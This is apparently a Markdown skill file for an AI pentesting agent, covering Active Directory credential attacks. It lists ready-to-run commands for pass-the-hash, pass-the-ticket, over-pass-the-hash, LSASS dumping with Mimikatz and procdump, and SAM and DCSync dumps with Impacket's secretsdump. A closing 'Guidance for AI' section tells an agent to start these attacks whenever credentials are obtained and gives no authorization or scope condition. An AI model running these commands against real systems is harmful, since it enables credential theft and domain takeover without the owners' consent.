# Credential Attacks Skill

## Goal

Move laterally in Active Directory using stolen credentials without knowing plaintext passwords.

## Techniques

### Pass-the-Hash (PTH)

Use NT hash to authenticate via NTLM without password.

#### Linux

```bash
# CrackMapExec
crackmapexec smb <target> -u <user> -H <NTHASH>
crackmapexec smb <target> -u <user> -H <NTHASH> --shares
crackmapexec smb <target> -u <user> -H <NTHASH> -x "whoami"

# Impacket psexec
psexec.py -hashes :<NTHASH> <DOMAIN>/<USER>@<TARGET>

# Impacket wmiexec
wmiexec.py -hashes :<NTHASH> <DOMAIN>/<USER>@<TARGET>

# Impacket smbexec
smbexec.py -hashes :<NTHASH> <DOMAIN>/<USER>@<TARGET>
```

#### Windows

```powershell
# Mimikatz
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTHASH> /run:cmd.exe
```

### Pass-the-Ticket (PTT)

Use Kerberos ticket to authenticate without password.

#### Windows

```powershell
# Export tickets
.\mimikatz.exe "sekurlsa::tickets /export"

# Import ticket
.\mimikatz.exe "kerberos::ptt <ticket.kirbi>"

# Rubeus import
.\Rubeus.exe ptt /ticket:<base64>
.\Rubeus.exe ptt /ticket:<file.kirbi>

# Verify
klist
```

#### Linux

```bash
# Export ticket for use
export KRB5CCNAME=/path/to/ticket.ccache

# Use with Impacket
psexec.py -k -no-pass <DOMAIN>/<USER>@<TARGET>
```

### Over-Pass-the-Hash (OPTH)

Convert NT hash to Kerberos TGT.

#### Windows

```powershell
# Get TGT from hash
.\Rubeus.exe asktgt /user:<USER> /rc4:<NTHASH> /ptt

# With domain
.\Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTHASH> /ptt
```

#### Linux

```bash
# Get TGT
getTGT.py -hashes :<NTHASH> <DOMAIN>/<USER>

# Export and use
export KRB5CCNAME=<USER>.ccache
psexec.py -k -no-pass <DOMAIN>/<USER>@<TARGET>
```

## Credential Extraction

### LSASS Dump

```powershell
# Mimikatz
.\mimikatz.exe "sekurlsa::logonpasswords"

# Procdump
procdump.exe -ma lsass.exe lsass.dmp
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
```

### Linux Remote

```bash
# Dump SAM
secretsdump.py <DOMAIN>/<USER>:<PASS>@<TARGET>

# With hash
secretsdump.py -hashes :<NTHASH> <DOMAIN>/<USER>@<TARGET>

# DCSync
secretsdump.py -just-dc <DOMAIN>/<USER>:<PASS>@<DC>
```

## Tools

* **mimikatz** - Windows credential extraction
* **CrackMapExec** - Multi-protocol execution
* **Impacket** - Python toolkit (psexec, wmiexec, smbexec)
* **Rubeus** - Kerberos toolkit

## Guidance for AI

* Activate when credentials obtained in AD environment
* PTH works with just NT hash (no plaintext needed)
* PTT requires valid Kerberos ticket
* Over-PTH converts hash to TGT for Kerberos auth
* CrackMapExec great for quick lateral movement testing
* Always try multiple protocols (SMB, WinRM, RPC)
